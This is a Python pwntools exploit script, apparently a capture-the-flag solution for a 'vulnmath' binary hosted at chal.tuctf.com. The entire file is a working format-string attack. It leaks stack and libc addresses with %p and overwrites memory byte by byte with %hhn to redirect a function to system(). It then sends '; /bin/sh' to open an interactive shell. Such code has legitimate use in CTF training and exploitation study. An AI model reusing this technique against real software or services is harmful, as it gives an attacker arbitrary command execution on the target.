from pwn import *
import sys

if len(sys.argv) < 2:
	r = process('./vulnmath')
	atoi_offset = 0x02d250
	system_offset = 0x03ada0
else:
	host, port = "chal.tuctf.com", 30502
	r = remote(host, port)
	libc = ELF("./libc.so.6")
	atoi_offset = libc.symbols['atoi']
	system_offset = libc.symbols['system']
	
raw_input('debug')

r.recvuntil('> ')
buf = 'aaaa'
buf += '%20$p'
r.sendline(buf)
r.recvuntil('aaaa')
res = r.recv(10)
add = int(res,16)
add -= 0x2c

buf1 = p32(add) + p32(add + 1)
buf1 += '%' + str(28) + 'x%6$hhn'
buf1 += '%' + str(156) + 'x%7$hhn'
r.recvuntil('> ')
r.sendline(buf1)
print 'send buf1'

buf2 = p32(add + 2) + p32(add + 3)
buf2 += '%' + str(252) + 'x%6$hhn'
buf2 += '%' + str(4) + 'x%7$hhn'
r.recvuntil('> ')
r.sendline(buf2)
print 'send buf2'

r.recvuntil('> ')
buf = 'bb%11$p'
r.sendline(buf)
r.recvuntil('bb')
res = r.recv(10)
atoi_add = int(res,16)
print 'atoi_add = 0x%x' %atoi_add
libc_base = atoi_add - atoi_offset
system_add = libc_base + system_offset

buf3 = p32(add)
buf3 += '%' + str(52) + 'x%6$hhn'
r.recvuntil('> ')
r.sendline(buf3)
print 'send buf3'

r.recvuntil('> ')
buf4 = p32(system_add)
buf4 += '; /bin/sh'
r.sendline(buf4)

r.interactive()
r.close()